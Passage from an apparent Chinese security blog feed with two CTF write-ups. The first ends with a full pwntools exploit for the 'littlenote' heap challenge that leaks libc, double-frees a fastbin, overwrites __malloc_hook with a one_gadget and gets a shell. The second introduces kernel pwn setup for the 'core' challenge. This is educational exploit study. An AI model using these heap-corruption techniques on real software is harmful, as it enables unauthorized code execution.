  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x55da162090a0 PREV_INUSE <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0, 
  size <span class="token operator">=</span> 4113, 
  fd <span class="token operator">=</span> 0xa31 <span class="token operator">&lt;</span>frame_dummy+17<span class="token operator">></span>, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x55da1620a0b0 PREV_INUSE <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0, 
  size <span class="token operator">=</span> 130897, 
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
pwndbg<span class="token operator">></span>
</code></pre>
<p>看到 leak出的地址为 fd = 0x7f896fa4fb0a <__realloc_hook+2>,</__realloc_hook+2></p>
<p>所以我们可以leak出__realloc_hook地址 从而计算得到libc_base 、malloc_hook_addr</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">__realloc_hook_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>__realloc_hook_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span>__realloc_hook_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>
malloc_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base
<span class="token keyword">print</span> <span class="token string">"malloc_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>malloc_addr<span class="token punctuation">)</span>
</code></pre>
<p>当然要利用double还需要绕过 main_arean是否指向向了原来的一个chunk 这个检查。这个就非常容易了，只需要free(p1);free(p2);free(p1)就可以绕过了</p>
<p>绕过后 fastbin list中会多指向一个我们的fake chunk 此时就可以实现任意地址写入了</p>
<p> onegadget </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ios:~$ ldd littlenote
    linux-vdso.so.1 <span class="token operator">=</span><span class="token operator">></span>  <span class="token punctuation">(</span>0x00007ffe0e13f000<span class="token punctuation">)</span>
    libc.so.6 <span class="token operator">=</span><span class="token operator">></span> /lib/x86_64-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0x00007fccaf9d7000<span class="token punctuation">)</span>
    /lib64/ld-linux-x86-64.so.2 <span class="token punctuation">(</span>0x00007fccaffa4000<span class="token punctuation">)</span>
ios@ios:~$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x45216    execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x30, environ<span class="token punctuation">)</span>
constraints:
  rax <span class="token operator">==</span> NULL

0x4526a    execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x30, environ<span class="token punctuation">)</span>
constraints:
  <span class="token punctuation">[</span>rsp+0x30<span class="token punctuation">]</span> <span class="token operator">==</span> NULL

0xf02a4    execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x50, environ<span class="token punctuation">)</span>
constraints:
  <span class="token punctuation">[</span>rsp+0x50<span class="token punctuation">]</span> <span class="token operator">==</span> NULL

0xf1147    execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x70, environ<span class="token punctuation">)</span>
constraints:
  <span class="token punctuation">[</span>rsp+0x70<span class="token punctuation">]</span> <span class="token operator">==</span> NULL
ios@ios:~$
</code></pre>
<p>使用one_gadget 当然还要满足一些其他条件 例如</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">0xf02a4    execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x50, environ<span class="token punctuation">)</span>
constraints:
  <span class="token punctuation">[</span>rsp+0x50<span class="token punctuation">]</span> <span class="token operator">==</span> NULL
</code></pre>
<p>需要满足rsp+0x50位置的值为0 否则无法成功利用 。需要重新寻找其他满足条件的one gadget</p>
<p>fastbin size检查绕过</p>
<p>在__malloc_hook - 0x23+0x8 处有合适的 size 0x7f </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/4gx 0x7fda4f7ccb10
0x7fda4f7ccb10 <span class="token operator">&lt;</span>__malloc_hook<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7fda4f7ccb20 <span class="token operator">&lt;</span>main_arena<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
pwndbg<span class="token operator">></span> x/4gx 0x7fda4f7ccb10-0x23
0x7fda4f7ccaed <span class="token operator">&lt;</span>_IO_wide_data_0+301<span class="token operator">></span>:    0xda4f7cb260000000    0x000000000000007f
0x7fda4f7ccafd:    0xda4f48de20000000    0xda4f48da0000007f
pwndbg<span class="token operator">></span> x/4gx 0x7fda4f7ccb10-0x23+0x8
0x7fda4f7ccaf5 <span class="token operator">&lt;</span>_IO_wide_data_0+309<span class="token operator">></span>:    0x000000000000007f    0xda4f48de20000000
0x7fda4f7ccb05 <span class="token operator">&lt;</span>__memalign_hook+5<span class="token operator">></span>:    0xda4f48da0000007f    0x000000000000007f
pwndbg<span class="token operator">></span>
</code></pre>
<p>所以构造当前可控fd为 __malloc_hook - 0x23即可</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> fastbin
fastbins
0x20: 0x0
0x30: 0x5614c91bb070 ◂— 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x5614c91bc120 —▸ 0x5614c91bc0b0 —▸ 0x7fda4f7ccaed <span class="token punctuation">(</span>_IO_wide_data_0+301<span class="token punctuation">)</span> ◂— 0xda4f48de20000000
0x80: 0x0
pwndbg<span class="token operator">></span>
</code></pre>
<p>可以看到当前fastbin 0x70大小的堆块 两次分配0x70堆块就可以分配到malloc_hook(0x60size+堆头0x10)</p>
<p>此时堆块addr=malloc_hook-0x13</p>
<p>所以再次申请堆块填充’a’*13+one_gadget 即可成功执行malloc hook 返回到one_gadget地址 拿到shell</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./littlenote"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your note"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"keep your note?"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"show?"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"delete?"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'N'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
__realloc_hook_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>__realloc_hook_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span>__realloc_hook_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>
malloc_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base
ret_malloc <span class="token operator">=</span> malloc_addr<span class="token number">-0x13</span>
<span class="token keyword">print</span> <span class="token string">'ret_malloc_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ret_malloc<span class="token punctuation">)</span>
__memalign_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__memalign_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base
_IO_2_1_stdin_ <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base
<span class="token keyword">print</span> <span class="token string">"malloc_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>malloc_addr<span class="token punctuation">)</span>
one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0xf02a4</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"bbb"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"ccc"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>malloc_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">"nnnn:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>malloc_addr<span class="token number">-0x23</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"ddd"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"eee"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>成功拿到shell</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">$ <span class="token function">ls</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x3 bytes:
    <span class="token string">'ls\n'</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0xbb bytes:
    <span class="token string">'core\t   Downloads\t     littlenote  one_gadget  pwntools\ttest.c\tVideos\n'</span>
    <span class="token string">'Desktop    examples.desktop  lt.py\t Pictures    te\t\tuaf\n'</span>
    <span class="token string">'Documents  libc.so.6\t     Music\t Public      Templates\tuaf.c\n'</span>
core       Downloads         littlenote  one_gadget  pwntools    test.c    Videos
Desktop    examples.desktop  lt.py     Pictures    te        uaf
Documents  libc.so.6         Music     Public      Templates    uaf.c
$
</code></pre>
<p> 推荐文章</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;迷途指针、野指针、空指针&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kernel学习-core</title>
    <link href="http://iosmosis.github.io/2018/11/18/kernel-core/"/>
    <id>http://iosmosis.github.io/2018/11/18/kernel-core/</id>
    <published>2018-11-18T15:27:12.000Z</published>
    <updated>2018-11-29T08:00:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>感谢CTF-wiki、P4nda、Veritas501  收获很大</p>
<p>首先捋清kernel pwn 与 用户态下的pwn的区别</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>正常用户态pwn 控制流程以后 跳转到 bin/sh 就可以了

而kernel pwn 还需要维护堆栈平衡  目的从取得shell变成了取得root权限shell
</code></pre><h3 id="现代操作系统的权限分离"><a href="#现代操作系统的权限分离" class="headerlink" title="现代操作系统的权限分离"></a>现代操作系统的权限分离</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>现代操作系统一般都至少分为内核态和用户态。一般应用程序通常运行于用户态，而当应用程序调用系统调用时候会执行内核代码，此时会处于内核态。一般的，应用程序是不能随便进入内核态的而是需要向OS申请，因为内核态拥有更高的权限。所以当程序运行的时候，其实是有两个栈的，一个位于用户态，一个位于内核态。他们之间会按照操作系统的规定进行通信
</code></pre><p>内核栈和用户栈分别处于内核空间和用户空间两个不同的空间中，因此，这两个栈是相互独立的，所以参数传递不能只是简单的压栈出栈，因此，Linux内核中主要是才用寄存器的方式来完成这个任务。</p>
<h3 id="intel的x86架构分级"><a href="#intel的x86架构分级" class="headerlink" title="intel的x86架构分级"></a>intel的x86架构分级</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>Intel x86架构使用了4个级别来标明不同的特权级权限。R0实际就是内核态，拥有最高权限。而一般应用程序处于R3状态--用户态。在Linux中，还存在R1和R2两个级别，一般归属驱动程序的级别。在Windows平台没有R1和R2两个级别，只用R0内核态和R3用户态。在权限约束上，使用的是高特权等级状态可以阅读低等级状态的数据，例如进程上下文、代码、数据等等，但是反之则不可。R0最高可以读取R0-3所有的内容，R1可以读R1-3的，R2以此类推，R3只能读自己的数据。因为shelllog应该写在内核中
</code></pre><h3 id="什么是ioctl"><a href="#什么是ioctl" class="headerlink" title="什么是ioctl"></a>什么是ioctl</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>ioctl是设备驱动程序中对设备的I/O通道进行管理的函数。所谓对I/O通道进行管理，就是对设备的一些特性进行控制，例如串口的传输波特率、马达的转速等等。它的调用个数如下： 
int ioctl(int fd, ind cmd, …)； 
    其中fd是用户程序打开设备时使用open函数返回的文件标示符，cmd是用户程序对设备的控制命令，至于后面的省略号，那是一些补充参数，一般最多一个，这个参数的有无和cmd的意义相关。 
    ioctl函数是文件结构中的一个属性分量，就是说如果你的驱动程序提供了对ioctl的支持，用户就可以在用户程序中使用ioctl函数来控制设备的I/O通道。
    在驱动程序中实现的ioctl函数体内，实际上是有一个switch{case}结构，每一个case对应一个命令码，做出一些相应的操作
</code></pre><p>具体解释：<a href="https://www.cnblogs.com/tdyizhen1314/p/4896689.html" target="_blank" rel="external">ioctl</a> </p>
<h3 id="swapgs"><a href="#swapgs" class="headerlink" title="swapgs"></a>swapgs</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>调用swapgs命令，在gs寄存器的内核与用户态值之间切换，为离开内核做准备
</code></pre><h3 id="中断返回指令"><a href="#中断返回指令" class="headerlink" title="中断返回指令"></a>中断返回指令</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>发生系统调用时，这是处于用户态的进程主动请求切换到内核态的一种方式。用户态的进程通过系统调用申请使用操作系统提供的系统调用服务例程来处理任务。而系统调用的机制，其核心仍是使用了操作系统为用户特别开发的一个中断机制来实现的，即软中断。

当一个中断服务程序执行完毕时，CPU将恢复被中断的现场，返回到引起中断的程序中。为了实现此项功能，指令系统提供了一条专用的中断返回指令。该指令的格式如下：
IRET/IRETD
该指令执行的过程基本上是INT指令的逆过程，具体如下：
1.从栈顶弹出内容送入IP；
2.再从新栈顶弹出内容送入CS；
3.再从新栈顶弹出内容送入标志寄存器；
</code></pre><h2 id="CORE"><a href="#CORE" class="headerlink" title="CORE"></a>CORE</h2><p>下载下来题目 查看下目录</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  give_to_player <span class="token function">ls</span>
bzImage  core.cpio  leak.py   vmlinux      vmlinux.id1  vmlinux.nam
core     gdb.sh     start.sh  vmlinux.id0  vmlinux.id2  vmlinux.til
</code></pre>
<p>去除ida调试文件 主要有以下文件</p>
<p>bzImage ：可以理解为压缩后的kernel文件 //可利用./extract-vmlinux ./bzImage &gt; vmlinux 提取静态kernel文件<br>core.cpio：打包好的磁盘文件<br>vmlinux ：静态kernel文件 //可以直接在此中查找gadget<br>start.sh：启动环境</p>
<p>根据p4nda师傅理解<br>*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的<br>查看下start.sh</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  give_to_player <span class="token function">cat</span> start.sh 
qemu-system-x86_64 \
-m 128M \           原本这里给的64M导致 环境无法运行 可以修改大于64M即可
-kernel ./bzImage \
-initrd  ./core.cpio \
-append <span class="token string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr"</span> \
-s  \                      这里设置了默认的gdb调试端口 1234
-netdev user,id<span class="token operator">=</span>t0, -device e1000,netdev<span class="token operator">=</span>t0,id<span class="token operator">=</span>nic0 \
-nographic  \
</code></pre>
<p>发现环境开启了kaslr 未开启smep<br>解包下core.cpio</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>mkdir core 

mv core.cpio ./core/core.cpio.gz 

cd core

gunzip core.cpio.gz 

cpio -idmv &lt; core.cpio

ls

➜  core ls
bin       core.id2  core.til     init   linuxrc  sbin  usr
core.id0  core.ko   etc          lib    proc     sys   vmlinux
core.id1  core.nam  gen_cpio.sh  lib64  root     tmp
</code></pre><p>除去ida调试文件<br>可以看到我们的驱动文件<br>core.ko<br>以及磁盘其他目录<br>查看下init</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  core <span class="token function">cat</span> init
<span class="token comment" spellcheck="true">#!/bin/sh</span>
<span class="token function">mount</span> -t proc proc /proc
<span class="token function">mount</span> -t sysfs sysfs /sys
<span class="token function">mount</span> -t devtmpfs none /dev
/sbin/mdev -s
<span class="token function">mkdir</span> -p /dev/pts
<span class="token function">mount</span> -vt devpts -o gid<span class="token operator">=</span>4,mode<span class="token operator">=</span>620 none /dev/pts
<span class="token function">chmod</span> 666 /dev/ptmx
<span class="token function">cat</span> /proc/kallsyms <span class="token operator">></span> /tmp/kallsyms
<span class="token keyword">echo</span> 1 <span class="token operator">></span> /proc/sys/kernel/kptr_restrict
<span class="token keyword">echo</span> 1 <span class="token operator">></span> /proc/sys/kernel/dmesg_restrict
<span class="token function">ifconfig</span> eth0 up
udhcpc -i eth0
<span class="token function">ifconfig</span> eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko
 poweroff -d 120 -f <span class="token operator">&amp;</span>
setsid /bin/cttyhack setuidgid 1000 /bin/sh
<span class="token keyword">echo</span> <span class="token string">'sh end!\n'</span>
<span class="token function">umount</span> /proc
<span class="token function">umount</span> /sys

poweroff -d 0  -f
</code></pre>
<p>看到 程序将/proc/kallsyms写入了 /tmp/kallsyms 并且使kptr_restrict 设置为1导致不能直接通过/proc/kallsyms 查找commit_creds，prepare_kernel_cred<br>但是可以通过/tmp/kallsyms  中查找获取</p>
<p>接着可以看到  poweroff -d 120 -f &amp; 设置了定时关机 这里删除就可以防止自动关机</p>
<h3 id="打包命令"><a href="#打包命令" class="headerlink" title="打包命令"></a>打包命令</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>由于题目提供了打包脚本 gen_cpio.sh

➜  core cat gen_cpio.sh
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 &gt; $1
 #$1 就是我们打包后的命名
./gen_cpio.sh core.cpio
.
......
......
./lib64/libm.so.6
./lib64/ld-linux-x86-64.so.2
./lib64/libc.so.6
./sys
125596 块
接着 
mv core.cpio ../
重启 kernel即可
</code></pre><p>我们写好的exp 也放在解包后的目录里，接着重新打包运行即可在虚拟机里查看到exp</p>
<h3 id="gdb远程调式问题"><a href="#gdb远程调式问题" class="headerlink" title="gdb远程调式问题"></a>gdb远程调式问题</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>target remote localhost:1234
</code></pre><p>通过 gdb ./vmlinux 启动时，虽然加载了 kernel 的符号表，但没有加载驱动 core.ko 的符号表，可以通过 add-symbol-file core.ko textaddr 加载<br>.text 段的地址可以通过 /sys/modules/core/section/.text 来查看</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>/ $ cat /sys/module/core/sections/.text
cat: can&#39;t open &#39;/sys/module/core/sections/.text&#39;: Permission denied
</code></pre><p>缺少权限<br>需要重新配置init </p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>➜  core cat init
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms &gt; /tmp/kallsyms
echo 1 &gt; /proc/sys/kernel/kptr_restrict
echo 1 &gt; /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko

#setsid /bin/cttyhack setuidgid 1000 /bin/sh
setsid /bin/cttyhack setuidgid 0 /bin/sh
echo &#39;sh end!\n&#39;
umount /proc
umount /sys

poweroff -d 0  -f
</code></pre><p>重新打包</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>➜  core ./gen_cpio.sh core.cpio
.
./vmlinux
........
........
./lib64/ld-linux-x86-64.so.2
./lib64/libc.so.6
./sys
125596 块

➜  core mv core.cpio ../
➜  give_to_player ./start.sh
</code></pre><p>再次查看</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  <span class="token function">cat</span> /sys/module/core/sections/.text
0xffffffffc028b000
</code></pre>
<p>所以加载 符号表</p>
